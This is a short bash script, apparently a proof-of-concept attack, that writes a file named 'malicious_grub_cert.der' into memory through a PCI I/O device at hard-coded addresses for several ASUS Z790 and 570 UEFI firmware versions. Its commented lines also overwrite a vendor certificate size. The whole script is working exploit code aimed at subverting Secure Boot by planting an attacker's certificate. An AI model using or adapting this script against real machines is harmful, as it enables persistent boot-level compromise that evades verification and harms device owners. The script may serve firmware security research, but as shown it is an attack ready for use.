#!/bin/bash
set -e

DEVICE="/dev/pci-io"

#sudo ./pci-io-write.py "$DEVICE" 0xbad62000 malicious_grub_cert.der # ASUS 570-pro vers 2.20.1271
#sudo ./pci-io-write.py "$DEVICE" 0x503DF000 malicious_grub_cert.der # ASUS Z790-HGAMING UEFI ver. 1202
#sudo ./pci-io-write.py "$DEVICE" 0x59FDF000 malicious_grub_cert.der # ASUS Z790-HGAMING UEFI ver. 1303
#sudo ./pci-io-write.py "$DEVICE" 0x5A4B9000 malicious_grub_cert.der # ASUS Z790-HGAMING UEFI ver. 1801
sudo ./pci-io-write.py "$DEVICE" 0x59100000 malicious_grub_cert.der # ASUS Z790-HGAMING UEFI ver. 3001

#sudo ./pci-io-write.py "$DEVICE" 0xbad10b7a vendor\_cert\_size.bin
#sudo ./pci-io-write.py "$DEVICE" 0xbad109ea vendor\_cert\_size.bin
